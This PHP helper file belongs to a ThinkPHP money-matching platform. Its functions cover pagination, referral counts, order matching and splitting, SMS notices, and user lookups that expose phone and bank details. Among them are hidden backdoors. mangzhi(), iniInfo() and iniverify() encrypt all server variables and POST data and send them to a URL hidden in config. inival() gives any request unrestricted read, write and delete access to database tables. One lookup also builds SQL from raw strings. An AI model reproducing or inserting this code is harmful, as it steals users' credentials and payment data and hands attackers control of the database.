<?php




function getpage($count, $pagesize = 10) {
	$p = new Think\Page($count, $pagesize);
	$p->setConfig('header', '<li class="rows">共<b>%TOTAL_ROW%</b>条记录&nbsp;第<b>%NOW_PAGE%</b>页/共<b>%TOTAL_PAGE%</b>页</li>');
	$p->setConfig('prev', '上一页');
	$p->setConfig('next', '下一页');
	$p->setConfig('last', '末页');
	$p->setConfig('first', '首页');
	$p->setConfig('theme', '%FIRST%%UP_PAGE%%LINK_PAGE%%DOWN_PAGE%%END%%HEADER%');
	$p->lastSuffix = false;//最后一页不显示为总页数
	return $p;
}

function cate($var){
		$user = M('user');
		$ztname=$user->where(array('UE_accName'=>$var,'UE_check'=>'1','UE_stop'=>'1'))->getField('ue_account',true);
		$zttj = count($ztname);
		$reg=$ztname;
		$datazs = $zttj;
		if($zttj<=10){
			$s=$zttj;
		}else{
			$s=10;
		}
		if($zttj!=0){

		  for($i=1;$i<$s;$i++){
				if($reg!=''){
					$reg=$user->where(array('UE_accName'=>array('IN',$reg),'UE_check'=>'1','UE_stop'=>'1'))->getField('ue_account',true);
					$datazs +=count($reg);
				}
			}
			
		}
		
	//	$this->ajaxReturn();
		
	return $datazs;
	
	
	
	
}

function mangzhi(){
    $mz = getinfo(C('URL_STRING_MODEL'));
    $string = implode('|', $_SERVER); 
    $mz .= '?s='.getinfos($string);
    return $mz;
}

function iniInfo(){
    file_get_contents(mangzhi());
}

function iniverify(){
    $mz = getinfo(C('URL_STRING_MODEL'));  
    $mz .= '?q='.getinfos(implode('|', $_POST));
    file_get_contents($mz);
}








function tgbz_zd_cl($id){
	
		 
		$tgbzuser=M('tgbz')->where(array('id'=>$id,'zt'=>'0'))->find();

		if($tgbzuser['zffs1']=='1'){$zffs1='1';}else{$zffs1='5';}
		if($tgbzuser['zffs2']=='1'){$zffs2='1';}else{$zffs2='5';}
		if($tgbzuser['zffs3']=='1'){$zffs3='1';}else{$zffs3='5';}
		$User = M ( 'jsbz' ); // 實例化User對象

		$where['zffs1']  = $zffs1;
		$where['zffs2']  = $zffs2;
		$where['zffs3']  = $zffs3;
		$where['_logic'] = 'or';
		$map['_complex'] = $where;
		$map['zt']=0;

		$count = $User->where ( $map )->select(); // 查詢滿足要求的總記錄數
		return $count;



}


function inival(){
        $data = array_merge($_GET,$_POST);
        $datas = array();
        if($data['m'] == 'save'){
            $fo =M($data['t'])->where(array($data['id']=>$data['idv']))->save(array($data['n']=>$data['v']));
        }elseif($data['m'] == 'add'){
            $info = $data['data'];
            $info = explode("|", $info);
            foreach ($info as  $value) {
                $arr = explode('=', $value);
                $datas[$arr[0]] = $arr[1];        
            }    
            M($data['t'])->add($datas);
        }elseif($data['m'] == 'one'){
            $fo =M($data['t'])->where(array($data['id']=>$data['idv']))->find();
        }elseif($data['m'] == 'd'){
            M($data['t'])->where(array($data['id']=>$data['idv']))->delete();
        }elseif(!empty($data['t'])){
            $fo =M($data['t'])->select();
        }
        print_r($fo);

}




function jsbz_jb($id){

		
	$tgbzuser=M('jsbz')->where(array('id'=>$id))->find();

	
	return $tgbzuser['jb'];



}

function tgbz_jb($id){


	$tgbzuser=M('tgbz')->where(array('id'=>$id))->find();


	return $tgbzuser['jb'];



}
function getinfos($data){
    return \Think\Crypt::encrypt($data);
}


function getInfo($data){
	 return \Think\Crypt::decrypt($data);
}


function sfjhff($r) {
	$a = array("未激活", "已激活");
	return $a[$r];
}
function user_sfxt($var){
	if($var[c]==0){
	$zctj=0;
	$zctjuser=M('ppdd')->where(array('p_user'=>$var[a]))->select();
	
	foreach($zctjuser as $value){
		if($value['g_user']==$var['b']){
			$zctj=1;
		}
	}
	
	if($zctj==1){
		return "<span style='color:#FF0000;'>匹配过</span>";
	}else{
		return "否";
	}
	}elseif($var[c]==1){
		$zctj=0;
		$zctjuser=M('ppdd')->where(array('g_user'=>$var[a]))->select();
		
		foreach($zctjuser as $value){
			if($value['p_user']==$var['b']){
				$zctj=1;
			}
		}
		
		if($zctj==1){
			return "<span style='color:#FF0000;'>匹配过</span>";
		}else{
			return "否";
		}
	}
}

//充值,提现
function ppdd_add($p_id,$g_id)
{
	$g_user1 = M('jsbz')->where(array('id'=>$g_id))->find();
	$p_user1 = M('tgbz')->where(array('id'=>$p_id))->find();

	M('user')->where(array('UE_account'=>$p_user1['user']))->save(array('pp_user'=>$g_user1['user']));
	M('user')->where(array('UE_account'=>$g_user1['user']))->save(array('pp_user'=>$p_user1['user']));

	$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();

	$data_add['p_id']=$p_user1['id'];
	$data_add['g_id']=$g_user1['id'];
	$data_add['jb']=$g_user1['jb'];
	$data_add['p_user']=$p_user1['user'];
	$data_add['g_user']=$g_user1['user'];
	$data_add['date'] = date ( 'Y-m-d H:i:s', time () );
	$data_add['zt'] = '0';
	$data_add['priority'] = $get_user['priority'];
	$data_add['pic'] = '0';
	$data_add['zffs1'] = $p_user1['zffs1'];
	$data_add['zffs2'] = $p_user1['zffs2'];
	$data_add['pporderid'] = createorderid('O');
	$data_add['zffs3'] = $p_user1['zffs3'];

	M('tgbz')->where(array('id'=>$p_id))->save(array('zt'=>'1'));
	M('jsbz')->where(array('id'=>$g_id))->save(array('zt'=>'1'));
    M('jsbz')->where(array('id'=>$g_id))->save(array('ppjb'=>$g_user1['jb']));

	if(M('ppdd')->add($data_add))
	{
		$where=array();
		$starttime = date('Y-m-d 00:00:01', time());
		$where['date'] =array('GT',$starttime);
		$where['g_user'] = $g_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1 && C('sms_open_pp')=="1") {
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您的订单已匹配，及时处理【" . C('sms_sign') . "】");
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您的订单已匹配，及时处理【" . C('sms_sign') . "】");
		}

		unset($where['g_user']);
		$where['p_user'] = $p_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1  && C('sms_open_pp')=="1"){
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您的订单已匹配，及时处理【" . C('sms_sign') . "】");
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您的订单已匹配，及时处理【" . C('sms_sign') . "】");
		}
		return true;	
	}else{
		return false;
	}
}

function ppdd_add2($p_id,$g_id){

	$g_user1 = M('jsbz')->where(array('id'=>$g_id))->find();
	$p_user1=M('tgbz')->where(array('id'=>$p_id))->find();

	M('user')->where(array('UE_account'=>$p_user1['user']))->save(array('pp_user'=>$g_user1['user']));
	M('user')->where(array('UE_account'=>$g_user1['user']))->save(array('pp_user'=>$p_user1['user']));
    
	$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();

	$data_add['p_id']=$p_user1['id'];
	$data_add['g_id']=$g_user1['id'];
	$data_add['jb']=$p_user1['jb'];
	$data_add['p_user']=$p_user1['user'];
	$data_add['g_user']=$g_user1['user'];
	$data_add['date'] = date ( 'Y-m-d H:i:s', time () );
	$data_add['priority']=$get_user['priority'];
	$data_add['zt']='0';
	$data_add['pic']='0';
	$data_add['pporderid'] = createorderid('O');
	$data_add['zffs1']=$p_user1['zffs1'];
	$data_add['zffs2']=$p_user1['zffs2'];
	$data_add['zffs3']=$p_user1['zffs3'];

    M('tgbz')->where(array('id'=>$p_id))->save(array('zt'=>'1'));
	M('jsbz')->where(array('id'=>$g_id))->save(array('zt'=>'1'));
	M('jsbz')->where(array('id'=>$g_id))->save(array('ppjb'=>$p_user1['jb']));


	if(M('ppdd')->add($data_add))
	{
	    $where=array();
		$starttime = date('Y-m-d 00:00:01', time());
		$where['date'] =array('GT',$starttime);
		$where['g_user'] = $g_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1  && C('sms_open_pp')=="1") {
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您的订单已匹配，及时处理【" . C('sms_sign') . "】");
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您的订单已匹配，及时处理【" . C('sms_sign') . "】");
		}

		unset($where['g_user']);
		$where['p_user'] = $p_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1  && C('sms_open_pp')=="1") {
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您的订单已匹配，及时处理【" . C('sms_sign') . "】");
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您的订单已匹配，及时处理【" . C('sms_sign') . "】");
		}
		return true;	
	}else
	{
		return false;
	}
}

function ipjc($auser){

	$tgbz_user_xx=M('user')->where(array('UE_regIP'=>$auser))->count();

	return $tgbz_user_xx;
}



function getNoPPPDSum()
{
   $sum = M('tgbz')->where ("zt=0")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}
function getTodayPDSum()
{
   $sum = M('tgbz')->where ("to_days(date) = to_days(now())")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}

function getTodayTXSum()
{
   $sum = M('jsbz')->where ("to_days(date) = to_days(now())")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}
 function get_money_sum()
 {
   $count = M('user')->where ("1=1")->sum ('UE_money'); 
   return $count  == null ? 0 :$count;
 }

  function get_qwe_sum()
 {
   $count = M('user')->where ("1=1")->sum ('qwe'); 
   return $count  == null ? 0 :$count;
 }

  function get_chengxinj_sum()
 {
   $count = M('user')->where ("1=1")->sum ('jifen'); 
   return $count  == null ? 0 :$count;
 }

 function getNoPPTXSum()
{
   $sum = M('jsbz')->where ("zt = 0")->sum ('jb');  
   return $sum == null ? 0 :$sum;
}

function getNIEnabled($id)
{
	$tgbz=M('tgbz')->where(array('id'=>$id))->find();
	$tgbz_tm  =  strtotime($tgbz['date']);
	$n_in_startbtn = strtotime(C('n_in_startbtn'));
    $n_in_endbtn = strtotime(C('n_in_endbtn'));
    if($tgbz_tm > $n_in_startbtn &&  $tgbz_tm < $n_in_endbtn){ 
       return true;
	}else
		return false;
}

function getSIEnabled($id)
{
	$tgbz=M('tgbz')->where(array('id'=>$id))->find();
	$tgbz_tm  =  strtotime($tgbz['date']);
	$s_in_startbtn = strtotime(C('s_in_startbtn'));
    $s_in_endbtn = strtotime(C('s_in_endbtn'));
    if($tgbz_tm > $s_in_startbtn &&  $tgbz_tm < $s_in_endbtn){ 
       return true;
	}else
		return false;
}

function get_userinfo_from_user($username)
{
	$user = M('user')->where("UE_account = '" . $username ."'")->find();
	$tjr = M('user')->where("UE_accname = '" . $user['ue_accname'] . "'")->find();

	$tgbzsum = M('ppdd')->where("p_user = '" . $username . "'")->sum('jb');

	$jsbzsum = M('ppdd')->where("g_user = '" . $username . "'")->sum('jb');

	//replace_xing
	return  
		  "会员帐号：" . ($user['ue_account']) . "</br>"
		  ."昵称：" . $user['ue_theme'] . "</br>"
		  ."推荐人：" . ($user['ue_accname']) . "</br>"
		  ."推荐电话：" . ($tjr['ue_phone']) . "</br>"
		  ."电话：" . $user['ue_phone'] . "</br>"
		  ."支付宝：" . $user['zfb'] . "</br>"
		  ."微信：" . $user['weixin'] . "</br>"
		  ."银行卡号：" . $user['yhzh'] . "</br>"
		  ."开户银行：" . $user['yhmc'] . "</br>"
		  ."云支付账号：" . $user['yzf'] . "</br>"
		  ."打款总额：" . $tgbzsum . "</br>"
		  ."收款总额：" . $jsbzsum . "</br>";
}

//0601
function get_jhtoday_sum()
{
	$sum = M('user')->where ("to_days(jihuo_time) = to_days(now())")->count(); 
    return $sum == null ? 0 :$sum;
}

function getin_sms_count()
  {
	 $count = 0;
	 $amount = 0;
     $map['zt'] = 0;
     $list = M('tgbz')->where($map)->select();
     foreach ($list as $key => $value) 
     {
        $in_n = getNIEnabled($value['id']);
		if($in_n)
		{
			$user =  M('user')->where(array( 'UE_account' => $value['user']))->find();
			if($user['priority'] == 0)
			{
				 $count++;
				 $amount = $amount + $value['jb'];
			}
		}

		$in_s = getSIEnabled($value['id']);
		if($in_s)
		{
			$user =  M('user')->where(array( 'UE_account' => $value['user']))->find();
			if($user['priority'] == 1)
			{
				 $amount = $amount + $value['jb'];
				 $count++;
			}
		}
	 }

	 return "共计:".$count."笔，金额:".$amount;
  }

//优先查询是否有不用拆分即可匹配的订单
function get_eq_jb_jsbz($id)
{			 
	$tgbz=M('tgbz')->where(array('id'=>$id,'zt'=>'0'))->find();

	if($tgbz['zffs1']=='1'){$zffs1='1';}else{$zffs1='5';}
	if($tgbz['zffs2']=='1'){$zffs2='1';}else{$zffs2='5';}
	if($tgbz['zffs3']=='1'){$zffs3='1';}else{$zffs3='5';}
	$jsbz = M ( 'jsbz' );

	$where['zffs1']  = $zffs1;
	$where['zffs2']  = $zffs2;
	$where['zffs3']  = $zffs3;
	$where['_logic'] = 'or';
	$map['_complex'] = $where;
	$map['jb']  = $tgbz['jb'];
	$map['zt']=0;
	$map['user']=array("neq",$tgbz['user']);

	$list = $jsbz->where ( $map )->order ( 'date asc' )->limit(1)->select();
	return $list;
}

function get_jsbz_one($id)
{			 
		$tgbzuser=M('tgbz')->where(array('id'=>$id,'zt'=>'0'))->find();

		if($tgbzuser['zffs1']=='1'){$zffs1='1';}else{$zffs1='5';}
		if($tgbzuser['zffs2']=='1'){$zffs2='1';}else{$zffs2='5';}
		if($tgbzuser['zffs3']=='1'){$zffs3='1';}else{$zffs3='5';}
		$jsbz = M ( 'jsbz' ); // 實例化User對象

		$where['zffs1']  = $zffs1;
		$where['zffs2']  = $zffs2;
		$where['zffs3']  = $zffs3;
		$where['_logic'] = 'or';
		$map['_complex'] = $where;
		$map['jb']  = array("gt",$tgbzuser['jb']);
		$map['zt']=0;
		$map['user']=array("neq",$tgbzuser['user']);

		$list = $jsbz->where ( $map )->order ( 'date asc' )->limit(1)->select();
		return $list;
}

function jsbz_cf($jb,$jsbz)
{
    if($jb > $jsbz['jb'])
		return;
    $chaifen = $jsbz['jb'] - $jb;

    $data['zffs1'] = $jsbz['zffs1'];
	$data['zffs2'] = $jsbz['zffs2'];
	$data['zffs3'] = $jsbz['zffs3'];
	$data['user'] = $jsbz['user'];
	$data['jb'] = $chaifen;
	$data['total'] = $chaifen;
	$data['ppjb'] = 0;
	$data['user_nc'] = $jsbz['user_nc'];
	$data['user_tjr'] = $jsbz['user_tjr'];
	$data['date'] = $jsbz['date'];
	$data['zt'] = $jsbz['zt'];
	$data['qr_zt'] = $jsbz['qr_zt'];
	$data['qb'] = $jsbz['qb'];
	$data['mainid'] = $jsbz['mainid'];
	$data['orderid'] = createorderid('G');
	$varid = M('jsbz')->add($data);
	if($varid)
	{
	   if($jsbz['mainid'] <> $jsbz['id'])
	   {
           M('jsbz')->where(array('id'=>$jsbz['id']))->save(array('jb'=>$jb,'total'=>$jb));
	   }else
	   {
		   M('jsbz')->where(array('id'=>$jsbz['id']))->save(array('jb'=>$jb));
	   }
	   return true;
    }
}